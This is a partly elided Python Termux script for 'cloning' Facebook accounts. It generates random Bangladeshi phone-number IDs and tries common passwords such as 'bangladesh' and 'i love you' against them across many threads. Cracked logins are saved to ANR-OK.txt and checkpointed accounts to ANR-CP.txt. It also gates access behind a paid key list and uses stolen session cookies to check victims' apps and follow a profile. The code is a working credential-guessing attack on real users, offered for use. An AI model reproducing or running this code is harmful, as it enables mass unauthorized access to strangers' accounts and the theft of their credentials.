...
import os
import random
import time#created by FB-KINGpython nop.py
#OWNER NAME Mahin Ahmemb
...
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU#created by FB-KING
#OWNER NAME Mahin Ahmemb
...
\033[1;91m │\033[1;97mVERSION   {K}: {H} 1.7.8   \033[1;91m                      │
\033[1;91m └───────────────────────────────────────────┘""")
...
try:
    key1 = open('/data/data/com.termux/files/usr/bin/.131756Pro777phpo-cov', 'r').read()
except:
    kok=open('/data/data/com.termux/files/usr/bin/.131756Pro777phpo-cov', 'w')
    kok.write(myid)
    kok.close()
def Subscraption():
    key1=open('/data/data/com.termux/files/usr/bin/.131756Pro777phpo-cov', 'r').read()
    os.system('clear')
    banner2()
    r1=requests.get("https://github.com/ANR-CYBER-143/Approval.txt/blob/main/Approved.txt").text
    if key1 in r1:
        os.system('clear')
        banner2()
        print(f"    {H}Subscraption Actived  {N}");time.sleep(2)
        main_menu()
    else:
        time.sleep(1.5)
        print(f"    {M}Subscraption Expired{N}")
        time.sleep(2)
        os.system("clear")
        banner2()
        print(f"    \033[1;37m[\033[1;31m✓\033[1;37m] {K} Your Key is Not Approved{N}")
        print (f"    \033[1;37m[\033[1;31m✓\033[1;37m]\033[1;34m Key {P}= {warna}"+key1)
        print(f'   {P} [{H}√{P}] [%s1%s{P}] {N}buy {H}premium {B}tools    '%(K,N));time.sleep(0.05)
        print(f'   {P} [{K}√{P}] [%s2%s{P}] {P}Contract Me {P}       '%(B,N));time.sleep(0.05)
        ...
        if opt =='B':
            os.system('xdg-open https://www.facebook.com/rifatofficial40/');Subscraption()
        else:
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        print(f'%s{P}[%s®%s] %sNOT FOUND APK%s         '%(N,U,N,B,N))
    else:
        print(f'%s √ Your Active Apps √     {B}       '%(H))
    ...
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s[%s!%s] %sNOT EXPIRED APK%s                '%(N,M,N,M,N))
    else:
        print(f'%s[{M}×{P}]{M} EXPIRED APK                 {P}'%(P))
        for i in range(len(game)):
...
def follow(ses,coki):
    ...
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=rifatofficial40', cookies={'cookie': coki}).text, 'html.parser')
...
def main_menu():
    ...
    print(mahinx)
    print(MR)
    print(f' {K}({H}1{K}){U} NEW RANDOM CLONING{P} {P}[{H}NEW{P}] ');time.sleep(0.05)
    print(f' {K}({H}2{K}) {H}CONTRACT ME {P}      ');time.sleep(0.05)
    mahin = input(f' {K}({H}?{K}){P} Select menu {M}:{H} ')
    if mahin in ["1","01"]:
        passx()
    elif mahin in ["2","02"]:
        os.system("xdg-open https://www.facebook.com/profile.php?id=rifatofficial40")
        main_menu()
    elif mahin in ["3","03"]:
        os.system("xdg-open https://www.facebook.com/rifatofficial40")
        main_menu()
    elif mahin in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION !!');main_menu()
MR ="""  \033[94;1m═══════════════════════════════════════════"""
ps ="""            \033[0;m[\033[92;1m \x1b[1;100m P A S S   M E N U   \033[0;m] """ 
LTD ="""            \033[0;m[\033[92;1m \x1b[1;100m L I M I T   M E N U   \033[0;m] """
mahinx ="""            \033[0;m[\033[91;1m\x1b[1;100m M A I N   M E N U   \033[0;m] """ 
...
def passx():
    os.system("clear")
    banner2()
    print(f"            \033[0;m[{M}{BA}  P A S S   M E N U   \033[0;m] ")
    print(MR)
    print(f"{K} ({P}1{K}) {H}NEW 8 DIGITS           {GREEN}[{H}FIRE{GREEN}]")
    print(f"{K} ({P}2{K}) {H}NEW 8 AND 11 DIGITS    {GREEN}[{H}FAST{GREEN}]")
    print(f"{K} ({P}3{K}) {H}NEW 8 DIGIT AND 1+1    {GREEN}[{H}TEST{GREEN}]")
    print(f"{K} ({P}4{K}) {B}NEW 7 DIGITS           {GREEN}[{B}FIRE{GREEN}]")
    print(f"{K} ({P}5{K}) {B}NEW 7 AND 11 DIGITS    {GREEN}[{B}FAST{GREEN}]")
    print(f"{K} ({P}6{K}) {B}NEW 7 DIGIT AND 1+1    {GREEN}[{B}BEST{GREEN}]")
    print(f"{K} ({P}7{K}) {K}NEW 6 DIGITS           {GREEN}[{K}FIRE{GREEN}]")
    print(f"{K} ({P}8{K}) {K}NEW 6 AND 11 DIGITS    {GREEN}[{K}FAST{GREEN}]")
    print(f"{K} ({P}9{K}) {K}NEW 6 DIGIT AND 1+1    {GREEN}[{K}BEST{GREEN}]")
    print(f"{K} ({P}A{K}) {N}NUMBER & 6/7/8/12 MIX  {GREEN}[{N}SLOW{GREEN}]")
    print(f"{K} ({P}B{K}) {U}MANUAL PASS & MIX PASS {GREEN}[{M}SLOW{GREEN}]")
    #print(f"{K}     [{H}C{K}] {P}NEW SYSTEM & MIX PASS      {GREEN}[{M}SLOW{GREEN}]")
    print(MR)
    mahin = input(f' {K}({P}?{K}){P} Select menu {B}:{H} ')
    if mahin in ["1","01"]:
        at1()
    elif mahin in ["2","02"]:
        at2()
        ...
        print('\033[1;31mINCORECT OPTION !!');exit()
sick ="""   \033[1;97m BD  CODE: [01601][01779][01991][01881]"""
def six_edit_pass():
    user=[]
    twf =[]
    os.getuid
    ...
    os.system("clear")
    banner2()
    print(f"                 {H}8 DIGIT{B} EDIT {K}CLONE{P} [{H}NEW{P}] ");time.sleep(0.05)
    print(MR)
    print(f'   \033[1;97m BD  CODE: {P}[{H}016{P}][{B}017{P}][{K}019{P}][{K}018{P}]')
    print(MR)
    code = input(f'{K} SEND CODE {P}:{N} ')
    print("")
    print(f' {P}({H}©{P}){B} EXAMPLE   {M} : {K}10000{N}/{B}20000{N}/{H}30000{P}')
    limit = int(input(f' %s(%s?%s) {N}CLONING ID LIMIT{K} : %s'%(K,H,K,H)))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    os.system("clear")
    banner2()
    passx = int(input(f'    {P}[{H}√{P}] {warna}PASSWORD LIMIT {M}:{H} '))
    Mahin = []
    print("")
    for bilal in range(passx):
        pww = input(f'    {P}[{H}√{P}] {warna}INPUT PASSWORD {M}:{H} ')
        Mahin.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        banner2()
        tl = str(len(user))
        #print(f' {P}({H}©{P}){B} AGENTS {M}   : {H}{warna1}')
        print(f' {P}({H}©{P}){B} PASSWORD  {M}:{H} %s'%(passx))
        print(f' {P}({H}©{P}){B} SIM CODE  : {H}%s           {H}  '%(code)) #print(f' {P}({H}©{P}){B} TOTAL ID{M}  : {H}%s           {H}  '%(code))
        print(f' {P}({H}©{P}){B} CRACK ID  : {H}%s'%(tl))
        print(f' {P}({H}©{P}){B} FILE SAVE : {H}ANR-OK.txt')
        print(f' {P}({H}©{P}){B} FILE SAVE : {M}ANR-CP.txt')
        print(f' {P}({H}©{P}){H} CLONING STARTED.... ')
        line1()
        for love in user:
            pwx = [love,'bangladesh']
            uid = code+love
    ...
    print(f'\n\n    {P} OK ID SAVE {H}ANR-OK.txt');exit()
def six3():
    uid=[]
    
    os.system('clear')
    banner2()
    print(f"                 {H} 1X1 DIGIT {K}CLONING{P} [{H}NEW{P}] ");time.sleep(0.05)
    print(MR)
    print(f'   \033[1;97m BD  CODE: {P}[{H}01601{P}][{B}01779{P}][{K}01991{P}][{K}01881{P}]')
    print(MR)
    kode = input(f'{K} SEND CODE {P}:{N} ')
    clear()
    banner2()
    print(LTD)
    print(MR)
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        tl = str(len(uid))
        #print(f' {P}({H}©{P}){B} AGENTS {M}   : {H}{warna1}')
        print(f' {P}({H}©{P}){B} SIM CODE  : {K}%s           {H}  '%(kode))
        print(f' {P}({H}©{P}){B} CRACK ID  : {H}%s'%(tl))
        print(f' {P}({H}©{P}){B} FILE SAVE : {H}ANR-OK.txt')
        print(f' {P}({H}©{P}){B} FILE SAVE : {M}ANR-CP.txt')
        print(f' {P}({H}©{P}){H} CLONING STARTED.... ')
        ...
        for guru in uid:
            ...
            bilal = uid[0:6]
            mk2 = guru
            pwx = [guru,mk,'bangladesh']
            yaari.submit(freeq,uid,pwx,tl)
    print('')
    opt = input(f'     {P}({H}!{P}) {P}MAIN MENU [{H}Y{P}/{M}T{K}] :{P}  ')
    if opt =='y':
        main_menu()
    elif opt =='Y':
        main_menu()
    else:
        print('\n\033[1;92m CHOOSE WRONG OPTION  \033[0;97m')
def six2():
    uid=[]
    
    os.system('clear')
    banner2()
    print(f"                 {H} 6X11 DIGIT {K}CLONING{P} [{H}NEW{P}] ");time.sleep(0.05)
    print(MR)
    print(sick)
    print(MR)
    kode = input(f'{K} SEND CODE {P}:{N} ')
...
def six1():
    ...
    os.system('clear')
    banner2()
    print(f"                 {H} 6 DIGIT {K}CLONING{P} [{H}NEW{P}] ");time.sleep(0.05)
    print(MR)
    print(sick)
    print(MR)
    kode = input(f'{K} SEND CODE {P}:{N} ')
...
def sat2():
    ...
    os.system('clear')
    banner2()
    print(f"                 {H} 7X11 DIGIT {K}CLONING{P} [{H}NEW{P}] ");time.sleep(0.05)
    print(MR)
    print(f'   \033[1;97m BD  CODE: {P}[{H}016{P}][{B}017{P}][{K}019{P}][{K}018{P}]')
    print(MR)
    kode = input(f'{K} SEND CODE {P}:{N} ')
...
def sat1():
    ...
    os.system('clear')
    banner2()
    print(f"                 {H} 7 DIGIT {K}CLONING{P} [{H}NEW{P}] ");time.sleep(0.05)
    print(MR)
    print(f'   \033[1;97m BD  CODE: {P}[{H}016{P}][{B}017{P}][{K}019{P}][{K}018{P}]')
    print(MR)
    kode = input(f'{K} SEND CODE {P}:{N} ')
...
def at2():
    ...
    os.system('clear')
    banner2()
    print(f"                 {H} 8X11 DIGIT {K}CLONING{P} [{H}NEW{P}] ");time.sleep(0.05)
    print(MR)
    print(f'   \033[1;97m BD  CODE: {P}[{H}016{P}][{B}017{P}][{K}019{P}][{K}018{P}]')
    print(MR)
    kode = input(f'{K} SEND CODE {P}:{N} ')
...
def at1():
    ...
    os.system('clear')
    banner2()
    print(f"                 {H} 8 DIGIT {K}CLONING{P} [{H}NEW{P}] ");time.sleep(0.05)
    print(MR)
    print(f'   \033[1;97m BD  CODE: {P}[{H}016{P}][{B}017{P}][{K}019{P}][{K}018{P}]')
    print(MR)
    kode = input(f'{K} SEND CODE {P}:{N} ')
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        tl = str(len(uid))
        #print(f' {P}({H}©{P}){B} AGENTS {M}   : {H}{warna1}')
        print(f' {P}({H}©{P}){B} SIM CODE  : {warna}{H}%s           {H}  '%(kode))
        print(f' {P}({H}©{P}){B} CRACK ID  : {H}%s'%(tl))
        print(f' {P}({H}©{P}){B} FILE SAVE : {H}ANR-OK.txt')
        print(f' {P}({H}©{P}){B} FILE SAVE : {M}ANR-CP.txt')
        print(f' {P}({H}©{P}){H} CLONING STARTED.... ')
        ...
        for guru in uid:
            ...
            bilal = uid[0:6]
            mk2 = guru
            pwx = [guru,'i love you','Bangladesh','bangladesh']
            yaari.submit(freeq,uid,pwx,tl)
    print('')
    opt = input(f' {P}({H}!{P}) {P}MAIN MENU [{H}Y{P}/{M}T{K}] :{P} ')
    if opt =='y':
...
def line1():
    print(f'{B}    -{H}-{M}-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{H}-{M}-{U}-{K}-{B}-{O}-{H}-{P}-{M}-{B}-{H}-{M}-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{H}-{M}-{U}-{K}-{B}-{O}-{H}-{P}{M}-{K}-{O}-{H}-{P}')
def mix():
    uid=[]
    
    os.system('clear')
    banner2()
    print(f"                 {H} MIX DIGIT {K}CLONING{P} [{H}NEW{P}] ");time.sleep(0.05)
    print(MR)
    print(f'   \033[1;97m BD  CODE: {P}[{H}016{P}][{B}017{P}][{K}019{P}][{K}018{P}]')
    print(MR)
    kode = input(f'{K} SEND CODE {P}:{N} ')
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for guru in uid:
            ...
            bilal = uid[0:6]
            mk2 = uid[:7]
            pwx = [guru,mk,mk2,kode+guru]
            yaari.submit(freeq2,uid,pwx,tl)
    print('')
    opt = input(f'     {P}({H}!{P}) {P}MAIN MENU [{H}Y{P}/{M}T{K}] :{P}  ')
    if opt =='y':
        main_menu()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print(f'{H} '+uid+'|'+ps+'\033[36;1m ')
               # cek_apk(session,coki)
                open('/sdcard/ANR-OK.txt', 'a').write(uid+' | '+ps+'\n ')
                ok.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print(f'{M} '+uid+'|'+ps+' \033[33;1m')
                open('/sdcard/ANR-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cp.append(uid)
                break
            else:
                continue
        ...
        sys.stdout.write(f'\r {B}[{H}MR-OVI{P}/{M}%s{B}]{P}OK{K}>{H}%s'%(loop,len(ok))),
        sys.stdout.flush()
    except:
        pass
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'method': 'GET',
            'path': '/?zero_e=3&zero_et=1673254114&_rdc=1&_rdr&refsrc=deprecated',
            'scheme': 'https',
